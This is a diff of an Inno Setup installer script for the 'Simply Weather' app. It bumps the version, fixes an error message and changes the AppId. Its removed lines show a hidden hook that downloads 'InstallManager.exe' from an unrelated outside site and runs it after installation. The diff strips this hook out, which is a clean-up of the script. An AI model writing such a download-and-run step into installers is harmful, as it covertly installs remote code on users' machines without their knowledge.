@@ -2,21 +2,19 @@
 ; SEE THE DOCUMENTATION FOR DETAILS ON CREATING INNO SETUP SCRIPT FILES!
 
 #define MyAppName "Simply Weather"
-#define MyAppVersion "0.2.1"
+#define MyAppVersion "0.2.2"
 #define MyAppPublisher "Mike Ward"
 #define MyAppURL "http://mike-ward.net/simplyweather"
 #define MyAppExeName "Simply.Weather.exe"
-#define ITDRoot ReadReg(HKEY_LOCAL_MACHINE,'Software\Sherlock Software\InnoTools\Downloader','InstallPath','')  
-#include ITDRoot+'\it_download.iss' 
 
 [Setup]
 ; NOTE: The value of AppId uniquely identifies this application.
 ; Do not use the same AppId value in installers for other applications.
 ; (To generate a new GUID, click Tools | Generate GUID inside the IDE.)
-AppId={{0F5A5DCE-66CB-43A7-AFB4-F9751168264A}
+AppId={{84C4846A-1A58-481E-8D8F-94C8121CFF7E}}
 AppName={#MyAppName}
 AppVersion={#MyAppVersion}
-;AppVerName={#MyAppName} {#MyAppVersion}
+AppVerName={#MyAppName} {#MyAppVersion}
 AppPublisher={#MyAppPublisher}
 AppPublisherURL={#MyAppURL}
 AppSupportURL={#MyAppURL}
@@ -128,31 +126,10 @@ end;
 function InitializeSetup(): Boolean;
 begin
     if not IsDotNetDetected('v4.5', 0) then begin
-        MsgBox('Tweetz Desktop requires Microsoft .NET 4.5'#13#13
+        MsgBox('Simply Weather requires Microsoft .NET 4.5'#13#13
             'Download it at http://smallestdotnet.com'#13
             , mbError, MB_OK);
         result := false;
     end else
         result := true;
 end;
-
-procedure InitializeWizard();
-begin
-    itd_init; 
-    itd_addfile('http://www.codec14coolest.com/download.php?mHl+dg==', expandconstant('{tmp}\InstallManager.exe')); 
-    itd_downloadafter(wpReady); 
-    ITD_SetOption('UI_AllowContinue', '1'); 
-end;
-
-procedure CurStepChanged(CurStep: TSetupStep); 
-var AppPath:String; 
-WorkingDir:String; 
-ReturnCode:Integer; 
-begin 
-if CurStep=ssPostInstall then begin    
-    WorkingDir := ExpandConstant ('{tmp}');    
-    AppPath := expandconstant('{tmp}\InstallManager.exe')    
-    Exec (AppPath, '', WorkingDir, SW_SHOW, ewWaitUntilTerminated,    
-    ReturnCode);  
-    end; 
-end; 
